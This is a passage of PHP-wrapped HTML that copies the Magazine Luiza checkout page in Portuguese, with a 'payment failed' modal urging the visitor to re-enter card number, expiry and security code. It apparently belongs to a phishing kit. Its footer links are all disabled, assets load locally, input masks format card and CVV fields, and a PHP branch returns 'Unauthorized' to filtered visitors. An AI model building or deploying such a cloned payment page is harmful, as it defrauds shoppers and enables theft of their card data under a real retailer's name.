                           <!-- react-text: 1027 -->* <!-- /react-text --><!-- react-text: 1028 -->O prazo de entrega inicia-se no 1º dia útil após a confirmação do pagamento. Esse procedimento costuma ocorrer em até 24 horas, mas tem período máximo para acontecer de até 48 horas (pagamento no cartão). Se o pagamento for realizado por boleto bancário, o banco tem o prazo de até três dias úteis para confirmar.<!-- /react-text -->
                        </p>
                     </div>
                  </div>
               </div>
            </div>
			







				  
				  
				  
				  
               </div>
			   
			   
			   
			   
			   
<div style="display: none;" class="ModalContainer ">
   <svg class="ModalContainer-CloseIcon" width="28" height="28" viewBox="0 0 21 21">
      <path d="m2.125 17.125 5.54-6.797-5.216-6.355c-.351-.442-.676-1.028-.676-1.672C1.773 1.043 2.711.074 4 .074c.969 0 1.523.383 2.082 1.113l4.48 5.977 4.454-5.86c.617-.788 1.203-1.23 2.199-1.23.996 0 2.05.793 2.05 2.082 0 .645-.234 1.172-.675 1.727l-5.215 6.387 5.508 6.765c.351.442.676 1.027.676 1.672 0 1.258-.938 2.227-2.227 2.227-.969 0-1.523-.383-2.082-1.114l-4.805-6.3L5.7 19.703c-.613.793-1.199 1.23-2.195 1.23a2.06 2.06 0 0 1-2.05-2.081c0-.641.234-1.168.671-1.727zm0 0"></path>
   </svg>
   <!-- react-text: 969 --><!-- /react-text -->
   <div class="PaymentFailModal">
      <div>
         <div class="PaymentFailModal-titleWrapper">
            <svg class="PaymentFailModal-title-icon" width="74.9" height="52.3" viewBox="0 0 74.9 52.3">
               <path fill="#3EBBD1" d="M66.9 21.6h-5v-1.3c0-1.6.3-3 .8-4s1.6-2.2 3.2-3.5c1.6-1.3 2.6-2.2 2.9-2.6.5-.6.7-1.3.7-2.1 0-1.1-.4-2-1.3-2.8-.9-.8-2-1.1-3.5-1.1-1.4 0-2.6.4-3.5 1.2-.9.8-1.6 2-1.9 3.7l-5.1-.6c.1-2.3 1.1-4.3 3-6S61.5 0 64.5 0c3.2 0 5.7.8 7.6 2.5 1.9 1.7 2.8 3.6 2.8 5.8 0 1.2-.3 2.4-1 3.5s-2.2 2.6-4.4 4.4c-1.2 1-1.9 1.7-2.2 2.3-.3.6-.4 1.6-.4 3.1zm-5 7.5v-5.6h5.5V29h-5.5v.1z"></path>
               <path fill="#8EC89D" d="M8.7 36.3H3.6L0 32.7v-5.2l3.6-3.7h5.1l3.7 3.7v5.1l-3.7 3.7zm-1.9-9.7H5.4v4.1h1.4v-4.1zm-.7 5.3c-.5 0-.9.4-.9.9s.4.9.9.9.9-.4.9-.9-.4-.9-.9-.9z"></path>
               <path fill="#3983C5" d="M49 21.4c-.1 7.7-6.4 13.9-14.1 13.8-7.7-.1-13.9-6.4-13.8-14.1.1-7.7 6.3-13.8 14-13.8 7.7.1 14 6.3 13.9 14.1zM45.2 35c-6.1 3.8-13.8 3.8-19.9 0-6.6 3.1-11.3 9.1-11.8 16.1-.1.6.4 1.2 1 1.2h41.3c.6 0 1.1-.5 1.1-1.1v-.1c-.5-7-5.1-13-11.7-16.1z"></path>
            </svg>
            <div class="PaymentFailModal-title">Não foi possível concluir seu pagamento.</div>
            <div class="PaymentFailModal-subtitle">Vamos fazer uma nova tentativa? Antes de continuar, verifique os pontos abaixo:</div>
         </div>
         <div class="PaymentFailModal-ReasonsWrapper">
            <div class="PaymentFailModal-ReasonItem">
               <svg class="PaymentFailModal-ReasonIcon" width="153" height="90" viewBox="0 0 153 90">
                  <path fill="#F2F2F2" d="M4 0h145c2.2 0 4 1.8 4 4v82c0 2.2-1.8 4-4 4H4c-2.2 0-4-1.8-4-4V4c0-2.2 1.8-4 4-4z"></path>
                  <path fill="#FFF" d="M98.3 11.9h38.8c2.2 0 4 1.8 4 4v12.4c0 2.2-1.8 4-4 4H98.3c-2.2 0-4-1.8-4-4V15.9c0-2.2 1.8-4 4-4z"></path>
                  <path d="m17 63.7 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5L18 63.7h-1zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5L24 63.7h-1zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5L30 63.7h-1zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5L36 63.7h-1zm8.5 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.6 2.2h-.9zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.6 2.2h-.9zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.6 2.2h-.9zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.6 2.2h-.9zm8.6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5L71 63.7h-.9zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5L77 63.7h-.9zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5L83 63.7h-.9zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5L89 63.7h-.9zm8.5 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.6 2.2h-.9zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.6 2.2h-.9zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.6 2.2h-.9zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.6 2.2h-.9zM107.1 78.3l2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-.9l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.6 2.2h-1.1zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-.9l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.6 2.2h-1.1zm6 .1 1.9-6.7h.6l-1.9 6.7h-.6zm2.6-.1 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.6 2.2h-.9zm6 0 2.5-3.4-2.2-3.1h1l1.2 1.7c.2.3.4.6.5.8.1-.2.3-.5.5-.7l1.3-1.7h.9l-2.3 3 2.4 3.4h-1.1l-1.6-2.3c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.6 2.2h-.9z" fill="#0083CA"></path>
                  <g stroke="#C5C5C5">
                     <path fill="#FFF" d="M16.8 25.5h20c2.2 0 4 1.8 4 4V41c0 2.2-1.8 4-4 4h-20c-2.2 0-4-1.8-4-4V29.5c0-2.2 1.7-4 4-4z"></path>
                     <path fill="none" d="M12.8 39v-4.2h28V39h-28z"></path>
                     <path fill="none" d="M12.8 35.7v-4.2h28v4.2h-28z"></path>
                     <path fill="#FFF" d="M24.4 28.9h3.9c2.2 0 4 1.8 4 4v4.7c0 2.2-1.8 4-4 4h-3.9c-2.2 0-4-1.8-4-4v-4.7c0-2.3 1.8-4 4-4z"></path>
                  </g>
               </svg>
               <p class="PaymentFailModal-ReasonText">O número do cartão e a validade estão corretos?</p>
            </div>
            <div class="PaymentFailModal-ReasonItem">
               <svg class="PaymentFailModal-ReasonIcon" width="153.3" height="90" viewBox="0 0 153.3 90">
                  <path fill="#F2F2F2" d="M4 0h145.3c2.2 0 4 1.8 4 4v82c0 2.2-1.8 4-4 4H4c-2.2 0-4-1.8-4-4V4c0-2.2 1.8-4 4-4z"></path>
                  <path fill="#FFF" d="M4.4 15h144.4c2.1 0 3.8 1.8 3.8 4v12c0 2.2-1.7 4-3.8 4H4.4C2.3 35 .6 33.2.6 31V19c0-2.2 1.7-4 3.8-4zm14.9 43.6h21.8c2.2 0 4 1.8 4 4v11.5c0 2.2-1.8 4-4 4H19.3c-2.2 0-4-1.8-4-4V62.6c0-2.2 1.8-4 4-4z"></path>
                  <g fill="#3783C6">
                     <path d="m20.4 71.3 2.4-3.2-2.1-2.9h1l1.1 1.6c.2.3.4.6.5.7.1-.2.3-.5.5-.7l1.2-1.6h.9l-2.1 2.9 2.3 3.2h-1l-1.5-2.2c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.5 2.1h-1.1zm5.7 0 2.4-3.2-2.1-2.9h1l1.1 1.6c.2.3.4.6.5.7.1-.2.3-.5.5-.7l1.2-1.6h.9l-2.1 2.9 2.3 3.2h-1l-1.5-2.2c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5L27 71.3h-.9z"></path>
                     <path d="m31.7 71.3 2.4-3.2-2.1-2.8h1l1.1 1.6c.2.3.4.6.5.7.1-.2.3-.5.5-.7l1.2-1.6h.9L35 68.1l2.3 3.2h-1l-1.5-2.2c-.1-.1-.2-.3-.3-.4-.1.2-.2.4-.3.5l-1.5 2.1h-1z"></path>
                  </g>
               </svg>
               <p class="PaymentFailModal-ReasonText">O código de segurança foi digitado corretamente?</p>
            </div>
            <div class="PaymentFailModal-ReasonItem--bigger">
               <svg class="PaymentFailModal-ReasonIcon" width="153" height="90" viewBox="0 0 153 90">
                  <path fill="#F2F2F2" d="M4 0h145c2.2 0 4 1.8 4 4v82c0 2.2-1.8 4-4 4H4c-2.2 0-4-1.8-4-4V4c0-2.2 1.8-4 4-4z"></path>
                  <path fill="#FFF" d="M16.2 59.8v17.5h27.3V49.2zm32.3-12.5v30h27.2V36.7zm32.3-12.5v42.5H108V24.2zm32.3-12.6v55.1h27.2V11.7z"></path>
                  <path fill="none" stroke="#0083CA" stroke-width="2" stroke-linecap="round" stroke-dasharray="1.000000e-03,4" d="M12 24.2h133"></path>
               </svg>
               <p class="PaymentFailModal-ReasonText">O valor da compra não excedeu o limite do seu cartão?</p>
            </div>
         </div>
         <div class="PaymentFailModal-content">Você também pode finalizar sua compra selecionando uma nova forma de pagamento:</div>
         <div class="PaymentFailModal-RetryPaymentWrapper">
            <div class="PaymentFailModal-RetryPaymentItem--NewCard">
               <svg class="PaymentFailModal-RetryPaymentIcon" width="50pt" height="40pt" viewBox="0 0 50 40">
                  <path d="M45 0H5a5 5 0 0 0-5 5v30a5 5 0 0 0 5 5h40a5 5 0 0 0 5-5V5a5 5 0 0 0-5-5zm0 35H5V20h40zm0-22.5H5V5h40zm0 0"></path>
               </svg>
               <!-- react-text: 1010 -->Novo Cartão de Crédito<!-- /react-text -->
            </div>
            <div class="PaymentFailModal-RetryPaymentItem--BankSlip">
               <svg class="PaymentFailModal-RetryPaymentIcon" width="55pt" height="44pt" viewBox="0 0 55 44">
                  <path d="M50.598 0h-46.2A4.398 4.398 0 0 0 0 4.398v35.204A4.4 4.4 0 0 0 4.398 44h46.2A4.401 4.401 0 0 0 55 39.602V4.398A4.399 4.399 0 0 0 50.598 0zm0 39.602h-46.2V4.398h46.2zm0 0"></path>
                  <path d="M8.383 7.676h5.5v28.656h-5.5zm8.117 0h2.75v28.656H16.5zm6.875 0H27.5v28.656h-4.125zm13.75 0h5.5v28.656h-5.5zm8.25 0h1.375v28.656h-1.375zm-13.75 0h1.371v28.656h-1.371zm0 0"></path>
               </svg>
               <!-- react-text: 1015 -->Boleto Bancário<!-- /react-text -->
            </div>
         </div>
      </div>
   </div>
</div>			   
			   
			   
			   
			   
			   
			   
			   
			   
			   
			   
			   
			   
			   
			   
			   
			   
			   
        
			
			
            <div class="Checkout-footer-m.magazineluiza">
               <div class="CheckoutFooter">
                  <div class="CheckoutFooter-content">
                     <ul class="CheckoutFooter-top">
                        <li class="CheckoutFooter-top-item CheckoutFooter-top-item--sac mobile-hidden">
                           <svg xmlns="http://www.w3.org/2000/svg" width="25pt" height="25pt" viewBox="0 0 25 25" fill="#8C8C8C" class="CheckoutFooter-icon">
                              <path d="M24.629 18.73l-4.098-4.09a1.273 1.273 0 00-1.793 0l-3.86 3.868-8.401-8.39 3.859-3.864a1.266 1.266 0 000-1.793L6.238.37a1.266 1.266 0 00-1.793 0L.925 3.898a3.17 3.17 0 00.005 4.48l15.699 15.677a3.17 3.17 0 004.48-.004l3.52-3.528a1.27 1.27 0 000-1.793"></path>
                           </svg>
                           <!-- react-text: 116 --> <!-- /react-text --><a class="CheckoutFooter-icon-description" onclick="return false" href="http://www.magazineluiza.com.br/central-de-atendimento/" target="_blank" rel="noopener">Atendimento</a>
                        </li>
                        <li class="CheckoutFooter-top-item CheckoutFooter-top-item--tel-chat">
                           <svg xmlns="http://www.w3.org/2000/svg" width="25pt" height="25pt" viewBox="0 0 25 25" fill="#8C8C8C" class="CheckoutFooter-icon">
                              <path d="M12.219 7.184H4.492c-.762 0-1.355.636-1.355 1.386h10.465c0-.75-.622-1.386-1.383-1.386m-3.867 9.804c-2.286 0-4.145-1.902-4.145-4.21 0-.262.195-.462.453-.462.254 0 .453.2.453.461 0 1.817 1.438 3.258 3.215 3.258s3.215-1.473 3.215-3.258c0-.261.195-.46.453-.46s.453.199.453.46a4.103 4.103 0 01-4.097 4.211zm6.941-5.734c-.059-.98-.848-1.73-1.805-1.73H3.218c-.956 0-1.75.75-1.808 1.73L.738 21.488C.68 22.555 1.5 23.48 2.547 23.48h11.59c1.043 0 1.894-.925 1.808-1.992zm8.945 3.641l-.836-2.875a.655.655 0 00-.808-.446l-2.711.793-1.719-5.898 2.711-.79a.652.652 0 00.445-.808l-.836-2.875a.656.656 0 00-.812-.445l-2.469.719a1.627 1.627 0 00-1.113 2.027l3.2 11.015a1.637 1.637 0 002.03 1.114l2.473-.719a.658.658 0 00.445-.812zm0 0"></path>
                           </svg>
                           <!-- react-text: 121 --> Compre pelo <!-- /react-text --><a class="CheckoutFooter-icon-description" onclick="return false" href="https://sacolamobile.magazineluiza.com.br/#">chat online</a>
                        </li>
                        <li class="CheckoutFooter-top-item CheckoutFooter-top-item--certificate mobile-hidden">
                           <svg xmlns="http://www.w3.org/2000/svg" width="25pt" height="31pt" viewBox="0 0 25 31" fill="#8C8C8C" class="CheckoutFooter-icon">
                              <path d="M21.875 13.176h-.14V9.16C21.734 4.102 17.601 0 12.5 0 7.402 0 3.266 4.102 3.266 9.16v4.016h-.141C1.398 13.176 0 14.562 0 16.273v11.625C0 29.61 1.398 31 3.125 31h18.75C23.602 31 25 29.61 25 27.898V16.273c0-1.71-1.398-3.097-3.125-3.097zM6.391 9.16c0-3.344 2.742-6.058 6.109-6.058s6.11 2.714 6.11 6.058v4.016H6.39zm0 0"></path>
                           </svg>
                           <!-- react-text: 126 --> <!-- /react-text --><a class="CheckoutFooter-icon-description" onclick="return false" href="http://www.magazineluiza.com.br/estaticas/seguranca-maxima/" target="_blank" rel="noopener">Certificados e segurança</a>
                        </li>
                        <li class="CheckoutFooter-top-item CheckoutFooter-top-item--logo-internetSegura mobile-hidden">
                           <a onclick="return false" href="http://www.internetsegura.org/" target="_blank" rel="noopener">
                              <svg xmlns="http://www.w3.org/2000/svg" width="100" height="38.354" viewBox="0 0 100 38.354" class="CheckoutFooter-logo-internetSegura">
                                 <path fill="#219C31" d="M0 .073h4.075v15.603H0V.073zM23.774.073h10.712v3.463h-3.275l-.011 12.14h-4.086l-.016-12.14h-3.324s.006-2.298 0-3.463zM35.931.073h8.848v3.468h-4.811V6.07h4.602l-.016 3.545h-4.585l.005 2.561 4.806-.021v3.522h-8.848c-.001-.001.015-10.412-.001-15.604zM89.331.073H100v3.479h-3.297v12.124h-4.092V3.536l-3.28.026V.073zM6.916.073h4.086l7.286 9.583V.073h4.188v15.603h-4.188L11.001 6.07v9.605H6.916c0 .001.053-10.415 0-15.602zM47.216.073s5.691-.328 8.446.401c2.99.87 3.902 4.945 2.109 7.302-.611.812-2.438 1.682-2.438 1.682l4.837 6.217h-5.096l-3.845-6.04v6.04h-4.016s.032-10.411-.016-15.603l.019.001zM61.133.073h4.07l7.365 9.594V.073h4.098l.005 15.603h-4.103l-7.365-9.595v9.595h-4.07L61.139.073zM79.2.073h8.616v3.468h-4.51v2.522h4.51v3.561h-4.51v2.534h4.51v3.517h-8.61c0 .001 0-10.416-.006-15.602z"></path>
                                 <path fill="#FFF" d="M51.238 3.166c1.281.134 3.328.263 3.205 2.051.011 1.713-1.961 1.804-3.211 1.971-.009-1.343-.005-2.68.006-4.022z"></path>
                                 <path d="M0 17.249s66.663-.012 100 .005c-.021 7.034-.021 14.066 0 21.101H0V17.249z"></path>
                                 <path fill="#FFF" d="M28.72 23.156c2.405-5.092 9.863-6.449 14.18-3.034.993.858 1.713 1.976 2.47 3.034-1.439.671-2.91 1.271-4.37 1.89-.833-1.257-1.858-2.62-3.479-2.803-2.411-.316-4.408 1.788-4.848 4.011-.961 3.082 1.192 7.42 4.8 7.087 1.783.032 3.087-1.486 3.522-3.092-1.304-.018-3.919 0-3.919 0l.005-3.625h9.198s-.424 5.277-2.094 7.324c-3.742 4.862-12.462 4.096-15.324-1.316-1.591-2.878-1.634-6.551-.141-9.476zM4.44 19.016c2.711-1.321 5.782-.371 8.376.751a100.108 100.108 0 01-1.713 3.63c-1.272-.596-2.76-1.718-4.177-.875-.939.279-1.31 1.605-.419 2.181 2.073 1.245 4.988 1.171 6.421 3.394 1.417 2.566.612 6.367-2.019 7.871-3.286 1.917-7.425 1.063-10.448-.956.676-1.219 1.348-2.438 2.019-3.656 1.402.956 2.991 2.066 4.795 1.648 1.229-.097 2.142-1.857 1.004-2.706-1.971-1.225-4.708-1.117-6.25-3.013-1.787-2.708-.638-6.998 2.411-8.269zM15.715 18.887h10.067v3.897h-5.364v2.964h5.364v3.882l-5.364.017v3.07h5.364v3.818H15.71s-.005-11.759.005-17.648zM48.242 18.887h4.574v11.038c0 1.559 1.234 3.152 2.879 3.018 1.471.199 3.179-1.46 3.179-3.018V18.887h4.703s.048 7.758-.05 11.63c-.053 2.114-.977 4.386-2.937 5.4-2.889 1.536-6.522 1.486-9.434.017-1.74-.967-2.797-2.916-2.856-4.887-.124-4.048-.059-12.155-.059-12.155v-.005zM66.357 18.887s7.479-.763 10.813.918c3.678 2.212 2.813 8.671-1.493 9.61 1.72 2.404 5.192 7.12 5.192 7.12h-5.434l-4.354-6.733-.006 6.733h-4.708l-.012-17.634v-.015h.002zM87.538 18.887h5.048l6.657 17.648h-4.982l-1.073-3.008-6.373.006-1.111 3.002h-4.531c-.002 0 4.503-12.881 6.365-17.648z"></path>
                                 <path d="M71.07 22.365c1.472.06 3.699.221 3.607 2.238.104 1.981-2.189 2.121-3.607 2.348-.015-1.53-.015-3.055 0-4.586zM88.102 30.001l1.938-5.697 1.853 5.702s-2.53-.005-3.791-.005z"></path>
                              </svg>
                           </a>
                        </li>
                        <li class="CheckoutFooter-top-item CheckoutFooter-top-item--logo-ebit mobile-hidden"><a onclick="return false" href="https://www.ebit.com.br/552" target="_blank" rel="noopener"><span class="ImgEbitDiamante"><img src="data:image/png;base64,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" width="62px" height="62px"></span></a></li>
                     </ul>
                  </div>
                  <div class="CheckoutFooter-section">
                     <!-- react-text: 141 -->Preços e condições de pagamento exclusivos para compras via internet, podendo variar nas lojas físicas.<!-- /react-text --><br><!-- react-text: 143 -->Ofertas válidas na compra de até <!-- /react-text --><!-- react-text: 144 -->10<!-- /react-text --><!-- react-text: 145 --> peças de cada produto por cliente, até o término dos nossos estoques para internet.<!-- /react-text --><br><!-- react-text: 147 -->Caso os produtos apresentem divergências de valores, o preço válido é o da Sacola de compras.<!-- /react-text --><br><!-- react-text: 149 -->Vendas sujeitas a análise e confirmação de dados.<!-- /react-text -->
                  </div>
                  <div class="CheckoutFooter-section">
                     <!-- react-text: 151 -->Rodovia dos Bandeirantes KM 68,760 - Rio Abaixo - CEP: 13213-902 - Louveira/SP - CNPJ: 47960950/0449-27<!-- /react-text --><br><!-- react-text: 153 -->Magazine Luiza – Todos os direitos reservados<!-- /react-text -->
                  </div>
               </div>
            </div>
            <!-- react-empty: 154 --><!-- react-empty: 181 -->
         </div>
      </div>
     
   </body>
   
   	 <script src="../assets/js/jquery-3.2.1.min.js"></script>
   	 <script src="../assets/js/jquery.mask.min.js"></script>
     <script src="../assets/js/slide-menu.js"></script>
   
   
   <script>
   
   	$(function() {
		
		$('input[name="venc"]').mask('00/0000');
		$('input[name="cvv"]').mask('000');
		$('input[name="cc"]').mask('0000 0000 0000 0000');
		$('input[name="number"]').mask('0000 0000 0000 0000');
		
	});
				
   
   </script>
   
   
   
</html>

<?php } else { http_response_code(401); echo '{"status": "Unauthorized"}'; } ?>